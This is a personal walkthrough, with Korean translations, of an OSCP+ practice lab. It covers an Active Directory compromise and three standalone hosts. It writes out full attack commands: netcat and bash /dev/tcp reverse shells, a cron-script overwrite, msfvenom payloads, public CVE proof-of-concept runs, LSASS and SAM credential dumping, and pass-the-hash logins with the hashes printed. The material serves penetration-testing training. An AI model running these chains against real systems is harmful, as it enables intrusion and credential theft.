About this lab

This lab involves a sophisticated attack chain against an Active Directory environment. Learners begin by exploiting a vulnerable webapp to achieve remote code execution, followed by privilege escalation Privilege abuse. Through lateral movement, pivoting across network segments, and cracking Kerberos tickets, learners must enumerate and compromise domain assets to achieve full domain control.

Lab Description

This lab presents a complex attack chain targeting an Active Directory environment, simulating a full-domain compromise. Learners begin by exploiting a remote code execution flaw in an Attendance and Payroll System to gain an initial foothold. From there, they escalate privileges using impersonation tactics or known vulnerabilities. The lab continues with lateral movement through network segments, leveraging compromised credentials, tunneling tools, and AD enumeration techniques. By cracking Kerberos tickets and harvesting sensitive hashes, learners ultimately compromise the domain controller and exfiltrate key proof files.

This lab is designed for red teamers, penetration testers, and advanced security professionals looking to sharpen their skills in AD exploitation. Participants will develop expertise in RCE exploitation, privilege escalation, credential abuse, lateral movement, Kerberos-based attacks, and domain dominance strategies—key competencies for real-world enterprise security assessments.

Learning Objectives

## After completing this lab, learners will be able to:

- Exploit a remote code execution vulnerability in the Attendance and Payroll System to gain an initial foothold.
- Escalate privileges on the initial target system using impersonation techniques or known exploits.
- Perform lateral movement using compromised credentials, tunneling tools, and domain enumeration scripts.
- Crack Kerberos tickets and extract sensitive hashes to identify privileged users or service accounts.
- Compromise the domain controller and retrieve proof files, demonstrating complete domain dominance.
##### 

Objectives

This is the first of three dedicated OSCP Challenge Labs. It is composed of six OSCP+ machines. The intention of this Challenge is to provide a mock-exam experience that closely reflects a similar level of difficulty to that of the actual OSCP+ exam.

The challenge contains three machines that are connected via Active Directory, and another three standalone machines that do not have any dependencies or intranet connections. All of the standalone machines have a `local.txt` and a `proof.txt` flag, however the Active Directory set only has a `proof.txt` on the Domain Controller. While the Challenge Labs have no point values, on the exam the standalone machines would be worth 20 points each for a total of 60 points. The Active Directory set is worth 40 points all together.

To align with the OSCP+ 'Assumed Breach' scenario for the Active Directory portion of the exam, please use the credentials below for initial access: Username: Eric.Wallows Password: EricLikesRunning800

All the intended attack vectors for these machines are taught in the PEN-200 Modules, or are leveraged in the PEN-200 Challenge Labs 1-3. However, the specific requirements to trigger the vulnerabilities may differ from the exact scenarios and techniques demonstrated in the course material. You are expected to be able to take the demonstrated exploitation techniques and modify them for the current environment.

Please feel free to complete this challenge at your own pace. While the OSCP+ exam lasts for 23:45 hours, it is designed so that the machines can be successfully attacked in much less time. While each student is different, we highly recommend that you plan to spend a significant amount of time resting, eating, hydrating, and sleeping during your exam. Thus, we explicitly **do not** recommend that you attempt to work on this Challenge Lab for 24 hours straight.

We recommend that you begin with a network scan on all the provided IP addresses, and then enumerate each machine based on the results. When you are finished with the Challenge, we suggest that you create a mock-exam report for your own records, according to the advice provided in the Report Writing for Penetration Testers Module.

Good luck!

# Information Gathering

## Network Enumeration


"An initial **network discovery scan** was performed on the `192.168.243.0/24` subnet using `Nmap` to identify active hosts within the scope." (범위 내 활성화된 호스트를 식별하기 위해 `Nmap`을 사용하여 `192.168.243.0/24` 서브넷에 대한 초기 네트워크 탐색 스캔을 수행했습니다.)

`Eric.wallows / EricLikesRunning800`
```bash
nxc smb 192.168.243.0/24 -u 'Eric.Wallows' -p 'EricLikesRunning800' --continue-on-success --ignore-pw-decoding
```
![[Pasted image 20260108142238.png]]

```bash
nmap -sV -p- --min-rate 5000 192.168.243.0/24 -oG 192.168.243.0_24.log
```

# 192.168.243.141


![[Pasted image 20260108142745.png]]

## Initial Access


"After authenticating with the provided credentials, the `whoami /priv` command **confirmed that the current user possesses the `SeImpersonatePrivilege`**." (제공된 자격 증명으로 인증한 후, `whoami /priv` 명령을 통해 현재 사용자가 `SeImpersonatePrivilege` 권한을 보유하고 있음을 확인했습니다.)


```bash
evil-winrm -i 192.168.243.141 -u 'Eric.Wallows' -p 'EricLikesRunning800'
whoami /priv
```


![[Pasted image 20260108143930.png]]

## Privilege Escalation

"To escalate privileges, the `PrintSpoofer64.exe` exploit was executed to leverage the `SeImpersonatePrivilege`." (권한 상승을 위해 `PrintSpoofer64.exe` 익스플로잇을 실행하여 `SeImpersonatePrivilege`를 활용했습니다. )

```powershell
upload PrintSpoofer64.exe
upload nc64.exe
.\PrintSpoofer64.exe -c "nc64.exe 192.168.45.242 4444 -e powershell"
```
![[Pasted image 20260108150440.png]]


 "A **Netcat (nc) listener** was established to capture the reverse shell, which **successfully provided a session with SYSTEM authority**."(리버스 셸을 캡처하기 위해 Netcat 리스너를 구축했으며, 결과적으로 SYSTEM 권한의 세션을 성공적으로 획득했습니다.)
![[Pasted image 20260108150908.png]]


## Post-Exploitation

"The user account `Eric.Wallows` was **successfully added to the local Administrators group** to ensure persistent administrative access." (지속적인 관리자 권한 접속을 보장하기 위해 `Eric.Wallows` 사용자 계정을 로컬 Administrators 그룹에 성공적으로 추가했습니다.)
```powershell
net localgroup Administrators eric.wallows /add
```

![[Pasted image 20260108151719.png]]

"With `Eric.wallows` in the **Administrators group**, `NetExec`'s **`lsassy` module** successfully extracted credentials from memory."
- (번역: `Eric.wallows`가 Administrators 그룹에 포함된 상태에서, `NetExec`의 `lsassy` 모듈로 메모리에서 자격 증명을 성공적으로 추출했습니다.)
 
`OSCP\celia.almeda e728ecbadfb02f51ce8eed753f3ff3fd`
`MS01\Mary.Williams 9a3121977ee93af56ebd0ef4f527a35e`

```bash
nxc smb 192.168.243.141 -u 'Eric.Wallows' -p 'EricLikesRunning800' -M lsassy
```
![[Pasted image 20260108152200.png]]

## Pivoting

"Network routing information for **192.168.243.141** was retrieved by executing `route print` in a **PowerShell session**."

- (번역: PowerShell 세션에서 `route print`를 실행하여 192.168.243.141의 네트워크 라우팅 정보를 획득했습니다.)
```powershell
route print
```
![[Pasted image 20260108153330.png]]

"A **ligolo-ng** tunnel was established to facilitate **pivoting** into the internal network."
- (번역: 내부 네트워크로의 피벗팅을 원활하게 하기 위해 **ligolo-ng** 터널을 구축했습니다.)
```bash
sudo ./proxy -selfcert 
#execute agent
session #1
ifcreate 10.10.203.0
route_add --name 10.10.203.0 --route 10.10.203.0/24
start --tun 10.10.203.0
```
```powershell
.\agent.exe -connect 192.168.45.242:11601 -ignore-cert
```

![[Pasted image 20260108155844.png]]

# 10.10.203.142-MS02

## Nmap
![[Pasted image 20260108161337.png]]

## Lateral Movement (MS01 to MS02)
"The **recovered credentials** were used with **NetExec** to identify additional hosts with valid access."
- (번역: 획득한 자격 증명을 **NetExec**에 사용하여 유효한 접근 권한이 있는 추가 호스트를 식별했습니다.)
```bash
nxc winrm 10.10.203.0/24 -u users.txt -H hash.txt -t 100
```
![[Pasted image 20260108161021.png]]



"An interactive shell was obtained by authenticating to the target via **Evil-WinRM** using the recovered credentials."
- (번역: 획득한 자격 증명을 사용하여 **Evil-WinRM**으로 타겟에 인증하고 대화형 셸을 획득했습니다.)
```bash
evil-winrm -i 10.10.203.142 -u 'celia.almeda' -H 'e728ecbadfb02f51ce8eed753f3ff3fd'
```
![[Pasted image 20260108161603.png]]

## Privilege Escalation

"New user hashes were obtained by leveraging **impacket-secretsdump** against the **SAM and SYSTEM files** found in the legacy `Windows.old` folder."
- (번역: 레거시 `Windows.old` 폴더에서 발견된 **SAM 및 SYSTEM 파일**에 **impacket-secretsdump**를 활용하여 새로운 사용자 해시를 획득했습니다.)

```powershell
download C:\windows.old\Windows\system32\SAM
download C:\windows.old\Windows\system32\SYSTEM
```

```bash
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

```txt
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:acbb9b77c62fdd8fe5976148a933177a:::
tom_admin:1001:aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc:::
Cheyanne.Adams:1002:aad3b435b51404eeaad3b435b51404ee:b3930e99899cb55b4aefef9a7021ffd0:::
David.Rhys:1003:aad3b435b51404eeaad3b435b51404ee:9ac088de348444c71dba2dca92127c11:::
Mark.Chetty:1004:aad3b435b51404eeaad3b435b51404ee:92903f280e5c5f3cab018bd91b94c771:::
```
![[Pasted image 20260108162620.png]]


"The recovered credentials were used with **NetExec** to successfully authenticate as **`tom_admin`"
- (번역: 획득한 자격 증명을 **NetExec**에 사용하여 **`tom_admin`**으로 성공적으로 인증했습니다.)

```bash
nxc winrm 10.10.203.0/24 -u users2.txt -H hash2.txt --continue-on-success -t 100
```

![[Pasted image 20260108163906.png]]
```bash
evil-winrm -i 10.10.203.142 -u 'tom_admin' -H '4979d69d4ca66955c075c41cf45f24dc'
```

![[Pasted image 20260108164444.png]]


# 10.10.162.140 - DC01

## Nmap
![[Pasted image 20260108165148.png]]

## Lateral Movement(MS02 to DC01)

"The recovered credentials were used with **NetExec** to successfully authenticate as **`tom_admin`"
- (번역: 획득한 자격 증명을 **NetExec**에 사용하여 **`tom_admin`**으로 성공적으로 인증했습니다.)
```bash
evil-winrm -i 10.10.203.140 -u 'tom_admin' -H '4979d69d4ca66955c075c41cf45f24dc'
```

"The final **`proof.txt`** flag was successfully **retrieved**, confirming the complete compromise of the target system."
- (번역: 최종 **`proof.txt`** 플래그를 성공적으로 **획득**했으며, 이는 대상 시스템이 완전히 장악되었음을 확인합니다.)
![[Pasted image 20260108165931.png]]


# Independent Challenges
## 192.168.243.143-Aero
## Nmap
![[Pasted image 20260108142815.png]]


## Initial Access

"**CVE-2020-13151** was identified as a potential attack vector for the **cgms** service on port 3003. Access was obtained by executing a **PoC exploit** sourced from a public repository."

- (번역: 3003번 포트의 **cgms** 서비스에서 **CVE-2020-13151**을 잠재적 공격 경로로 식별했습니다. 공개 저장소에서 확보한 **PoC 익스플로잇**을 실행하여 접근 권한을 획득했습니다.)
- [https://github.com/b4ny4n/CVE-2020-13151](https://github.com/b4ny4n/CVE-2020-13151)

```bash
python cve2020-13151.py --ahost 192.168.187.143 --netcatshell --lhost=192.168.45.240 --lport=3000
```
![[Pasted image 20260109102616.png]]

"The **`local.txt`** flag was successfully **retrieved** from the **aero** home directory, confirming the initial compromise of the host."
- (번역: **aero** 홈 디렉토리에서 **`local.txt`** 플래그를 성공적으로 **획득**했으며, 이를 통해 초기 호스트 침투를 확인했습니다.)

```bash
rlwrap nc -lvnp 3000
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
export SHELL=bash
stty rows 31 cols 116;

Ctrl+C
stty raw -echo; fg
#script /dev/null -c /bin/bash
```
```bash
python3 -c 'import os, pty; os.environ["TERM"]="xterm"; os.environ["SHELL"]="bash"; pty.spawn("/bin/bash")'
```
![[Pasted image 20260109103233.png]]

## Privilege Escalation

"During post-exploitation enumeration, a **scheduled cron job** was identified, which executes the script **`/root/aerospike.sh`** every minute."
- (번역: 침투 후 열거 과정에서, 매분마다 **`/root/aerospike.sh`** 스크립트를 실행하는 **예약된 크론 작업(cron job)**을 확인했습니다.)

linpeas.sh result
![[Pasted image 20260109115344.png]]

"Using **`pspy64s`**, it was observed that the system repeatedly executes **`/root/aerospike.sh`**. This observation validated the existence of a background cron job running with **high privileges**."
- (번역: **`pspy64s`**를 통해 시스템이 **`/root/aerospike.sh`**를 반복적으로 실행하는 것을 관찰했습니다. 이 관찰을 통해 높은 권한으로 실행되는 백그라운드 크론 작업의 존재를 검증했습니다.)

![[Pasted image 20260109140036.png]]


"The permissions for **`/opt/aerospike/bin/asadm`** were inspected using **`ls -al`**, which confirmed that the file is **writable** by the current user."
- (번역: **`ls -al`** 명령어를 사용하여 **`/opt/aerospike/bin/asadm`**의 권한을 조사한 결과, 현재 사용자가 해당 파일에 대해 **쓰기 권한**을 가지고 있음을 확인했습니다.)
```bash
ls -al /opt/aerospike/bin/asadm
```

![[Pasted image 20260109140456.png]]



"A **reverse shell one-liner** was crafted and used to **overwrite** the `/opt/aerospike/bin/asadm` file, ensuring that the next cron job execution would trigger a root-level callback."
- (번역: **리버스 셸 한 줄 명령어**를 작성하여 `/opt/aerospike/bin/asadm` 파일을 **덮어썼습니다**. 이를 통해 다음 크론 작업이 실행될 때 루트 권한의 콜백이 트리거되도록 설정했습니다.)
```bash
echo "/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.240/443 0>&1'" > /opt/aerospike/bin/asadm
```
![[Pasted image 20260109141204.png]]



"With root access established, the **`proof.txt`** flag was successfully **retrieved** from the `/root` directory, confirming a complete compromise of the host."
- (번역: 루트 권한이 수립됨에 따라, `/root` 디렉토리에서 **`proof.txt`** 플래그를 성공적으로 **획득**했으며, 이는 호스트가 완전히 장악되었음을 확인합니다.)
![[Pasted image 20260109141138.png]]







# 192.168.243.144-crystal
## Nmap
![[Pasted image 20260108142837.png]]

## Initial Access
"Directory enumeration via **gobuster** revealed an exposed **.git repository**, allowing for the potential extraction of the application's source code and commit history."
- (번역: **gobuster**를 통한 디렉토리 열거 과정에서 노출된 **.git 저장소**를 확인했으며, 이를 통해 애플리케이션의 소스 코드와 커밋 히스토리를 추출할 수 있는 상태임을 파악했습니다.)
```bash
gobuster dir -u 192.168.187.144 -w /usr/share/wordlists/dirb/common.txt 
```
![[Pasted image 20260109153444.png]]
"The exposed **`.git` directory** was recursively downloaded via **`wget -r`** for offline source code analysis."
- (번역: 오프라인 소스 코드 분석을 위해 노출된 **`.git` 디렉토리**를 **`wget -r`**로 재귀 다운로드했습니다.)
```bash
wget -r "192.168.187.144/.git/"
```
![[Pasted image 20260109154007.png]]

"Reviewed the **commit history** via **`git log`** to identify potential credential leaks in previous versions."
- (번역: 이전 버전에서의 자격 증명 유출을 식별하기 위해 **`git log`**로 **커밋 히스토리**를 검토했습니다.)
```bash
git log
```
![[Pasted image 20260109161100.png]]


"Executing **`git show 44a055daf7a0cd777f28f444c0d29ddf3ff08c54`** revealed **hardcoded credentials** within the commit details."
(번역: **`git show 44a055d...`** 명령을 실행하여 커밋 내역에서 **하드코딩된 자격 증명**을 확인했습니다.)
```bash
git show 44a055daf7a0cd777f28f444c0d29ddf3ff08c54
```

![[Pasted image 20260109160730.png]]

"The recovered credentials were used to establish an **SSH session** on the target host. using the `stuart@challenge.lab / BreakingBad92` account"
- (번역: 획득한 자격 증명을 사용하여 대상 호스트에 **SSH 세션**을 수립했습니다.)
```bash
ssh stuart@192.168.187.144
```

![[Pasted image 20260109161823.png]]


## Privilenge Escalation
"**`linpeas.sh`** was utilized to discover the **`/opt/backup`** directory as a potential vector for privilege escalation."

- (번역: 권한 상승의 잠재적 경로로 **`/opt/backup`** 디렉토리를 찾기 위해 **`linpeas.sh`**를 활용했습니다.)
![[Pasted image 20260109163442.png]]


"The identified **ZIP archive** was transferred to the local machine via **rsync** for further analysis."
- (번역: 추가 분석을 위해 식별된 **ZIP 압축 파일**을 **rsync**를 통해 로컬 머신으로 전송했습니다.)
```bash
#main
nc -nlvp 4444 > backup.tar.gz
#target
nc 192.168.45.240 4444 < backup.tar.gz
```

```bash
# 내 Kali에서 실행 
rsync -avz --progress stuart@192.168.187.144:/opt/backup
```

![[Pasted image 20260109164813.png]]


"Attempts to extract the ZIP archive revealed that the **file is password-protected**."

- (번역: ZIP 압축 파일 해제를 시도한 결과, **파일에 패스워드가 설정**되어 있음을 확인했습니다.)
```bash
7z x sitebackup3.zip
```
![[Pasted image 20260109164936.png]]


"The password hash was extracted from the ZIP archive using **`zip2john`** to prepare for a brute-force attack."
- (번역: 브루트포스 공격을 준비하기 위해 **`zip2john`**을 사용하여 ZIP 압축 파일에서 패스워드 해시를 추출했습니다.)
```bash
zip2john sitebackup3.zip > sitebackup3_hashes.hash
```
![[Pasted image 20260109165258.png]]

"**John the Ripper** was utilized to crack the extracted hash, successfully **recovering the password** for the ZIP archive."
- (번역: **John the Ripper**를 사용하여 추출된 해시를 크래킹했으며, ZIP 압축 파일의 **패스워드를 성공적으로 복구**했습니다.)
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt sitebackup3_hashes.hash
```
![[Pasted image 20260109165807.png]]


"A recursive search using **`grep -r -i 'passw' *`** successfully identified **cleartext credentials** within the directory."
- (번역: **`grep -r -i 'passw' *`**를 이용한 재귀 검색을 통해 디렉토리 내에서 **평문 자격 증명**을 식별했습니다.)
```bash
grep -r -i 'passw' *
```
![[Pasted image 20260109170000.png]]

![[Pasted image 20260109170352.png]]

"Upon authenticating as **`chloe / Ee24zIK4cDhJHL4H`**, **`sudo -l`** revealed that the user possesses **full administrative privileges (ALL:ALL)**."

- (번역: **chloe** 계정으로 인증 후, **`sudo -l`**을 통해 해당 사용자가 **전체 관리자 권한(ALL:ALL)**을 보유하고 있음을 확인했습니다.)

![[Pasted image 20260109170623.png]]


"With root access established, the final **`proof.txt`** flag was successfully **retrieved** from the `/root` directory."
- (번역: 루트 권한을 획득한 후, `/root` 디렉토리에서 최종 **`proof.txt`** 플래그를 성공적으로 **획득**했습니다.)
![[Pasted image 20260109170718.png]]





# 192.168.243.145
## Nmap
![[Pasted image 20260112092035.png]]

## Initial Access

"Identified a relevant CVE on **Exploit-DB** for the **unisql** service. A **reverse shell binary** was then staged using a **Python HTTP server** for the exploit PoC."
- (번역: **unisql** 서비스에 대한 관련 CVE를 **Exploit-DB**에서 확인했습니다. 익스플로잇 PoC를 위해 **Python HTTP 서버**를 사용하여 **리버스 셸 바이너리**를 대기시켰습니다.)

https://www.exploit-db.com/exploits/49601


```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.204 LPORT=4444 -f exe -o payload.exe
```
![[Pasted image 20260112095106.png]]

Execute Payload
```bash
python2 49601.py 192.168.121.145 192.168.45.176:80 payload.exe
```
![[Pasted image 20260112100243.png]]

Retrieve local.txt
![[Pasted image 20260112100546.png]]

## Privilege Escalation

"**WinPEAS** was utilized to identify **cleartext credentials** for the user **zachary** stored within the **Putty session registry**."
- (번역: **WinPEAS**를 활용하여 **Putty 세션 레지스트리**에 저장된 **zachary** 사용자의 **평문 자격 증명**을 식별했습니다.)
![[Pasted image 20260112102021.png]]

"The previously recovered credentials were used to establish an **RDP session** on the target host as the user **zachary**."
- (번역: 이전에 획득한 자격 증명을 사용하여 대상 호스트에 **zachary** 사용자로 **RDP 세션**을 수립했습니다.)
- 
![[Pasted image 20260112102303.png]]

Retrieve proof.txt
![[Pasted image 20260112102355.png]]

